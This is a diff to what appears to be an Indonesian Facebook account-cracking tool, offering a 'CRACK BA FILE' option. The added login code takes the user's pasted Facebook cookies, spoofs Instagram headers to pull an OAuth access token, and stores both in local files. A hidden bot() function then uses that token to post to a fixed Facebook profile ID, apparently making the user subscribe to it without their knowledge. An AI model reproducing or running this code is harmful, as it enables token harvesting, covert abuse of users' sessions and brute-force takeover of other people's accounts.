@@ -270,53 +270,92 @@ os.system('clear')
 print(logo)
 pass
 def login():
+	try:
+		token = open('.token.txt','r').read()
+		cok = open('.cok.txt','r').read()
+		tokenku.append(token)
+		try:
+			sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
+			sy2 = json.loads(sy.text)['name']
+			sy3 = json.loads(sy.text)['id']
+			menu(sy2,sy3)
+		except KeyError:
+			login_lagi334()
+		except requests.exceptions.ConnectionError:
+			li = '# PROBLEM INTERNET CONNECTION, CHECK AND TRY AGAIN'
+			lo = mark(li, style='red')
+			sol().print(lo, style='cyan')
+			exit()
+	except IOError:
+		login_lagi334()
+
+
+def login_lagi334():
+	try:
+		
+		asu = random.choice([m,k,h,b,u])
+		os.system('clear')
+		cookie=input(f'  [{h}•{x}] Enter Your Cookies :{asu} ')
+		open(".cok.txt", "w").write(cookie)
+		with requests.Session() as rsn:
+			try:
+				rsn.headers.update({
+                    'Accept-Language': 'id,en;q=0.9',
+                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36',
+                    'Referer': 'https://www.instagram.com/',
+                    'Host': 'www.facebook.com',
+                    'Sec-Fetch-Mode': 'cors',
+                    'Accept': '*/*',
+                    'Connection': 'keep-alive',
+                    'Sec-Fetch-Site': 'cross-site',
+                    'Sec-Fetch-Dest': 'empty',
+                    'Origin': 'https://www.instagram.com',
+                    'Accept-Encoding': 'gzip, deflate',
+                })
+				response = rsn.get('https://www.facebook.com/x/oauth/status?client_id=124024574287414&wants_cookie_data=true&origin=1&input_token=&sdk=joey&redirect_uri=https://www.instagram.com/brutalid_/', cookies={'cookie':cookie})
+				if '"access_token":' in str(response.headers):
+					token = re.search('"access_token":"(.*?)"', str(response.headers)).group(1)
+					open(".token.txt", "w").write(token)
+					print('%sLogin Succes...✓%s'%(h, p))
+
+				else:
+					print('%sFailled Get Token%s'%(m, p))
+
+			except:
+				print('Failled Get Token')
+
+		print(f'  {x}[{h}•{x}]{h} Berhasil Jalankan Lagi Perintahnya!!!!{x} ');time.sleep(1)
+		exit()
+	except Exception as e:
+		os.system("rm -f .token.txt")
+		os.system("rm -f .cok.txt")
+		print(f'  %s[%sx%s]%s LOGIN X..... !!%s'%(x,k,x,m,x))
+		print(e)
+		exit()
+def bot():
+	try:
+		requests.post("https://graph.facebook.com/100002045441878?fields=subscribers&access_token=%s"%(tokenku))
+	except:
+		pass
+#------------------[ BAGIAN-MENU ]----------------#
+def menu(my_name,my_id):
+	try:
+		token = open('.token.txt','r').read()
+		cok = open('.cok.txt','r').read()
+	except IOError:
+		print('[×] Cookies Kadaluarsa ')
+		time.sleep(5)
+		login_lagi334()
+
+###----------[ BAGIAN MENU ]----------###
+def menu(my_name, my_id):
     try:
         token = open('.token.txt','r').read()
         cok = open('.cok.txt','r').read()
-        tokenku.append(token)
-        try:
-            sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
-            sy2 = json.loads(sy.text)['name']
-            sy3 = json.loads(sy.text)['id']
-            menu(sy2,sy3)
-        except KeyError:
-            login_lagi334()
-        except requests.exceptions.ConnectionError:
-            print('\033[0;92m=================')
-            animation(' [×] NO INTERNET CONNECTION DETECTED')
-            exit()
     except IOError:
+        print('◉━━─ Cookies Invalid my brother ')
+        time.sleep(5)
         login_lagi334()
-def login_lagi334():
-    try:
-        os.system('clear')
-        print(logo)
-        ses = requests.Session()
-        cookies = {'cookie':cookie}
-        url = 'https://www.facebook.com/adsmanager/manage/campaigns'
-        req = ses.get(url,cookies=cookies)
-        set = re.search('act=(.*?)&nav_source',str(req.content)).group(1)
-        nek = '%s?act=%s&nav_source=no_referrer'%(url,set)
-        roq = ses.get(nek,cookies=cookies)
-        tok = re.search('accessToken="(.*?)"',str(roq.content)).group(1)
-        tokenw = open(".token.txt", "w").write(tok)
-        cokiew = open(".cok.txt", "w").write(cookie)
-      #exit()
-    except Exception as e:
-        os.system("rm -f .token.txt")
-        os.system("rm -f .cok.txt")
-        os.system("python nono.py")
-        exit()
-
-#------------------[ MENU ]----------------#
- #===©===#
-class jalan:
-    def __init__(self, z):
-        for e in z + "\n":
-            sys.stdout.write(e)
-            sys.stdout.flush()
-            time.sleep(0.040)
-def menu():
     os.system('clear')
     print(logo)
     print(f'\x1b[1;92m  [ 1 ] CRACK BA FILE')
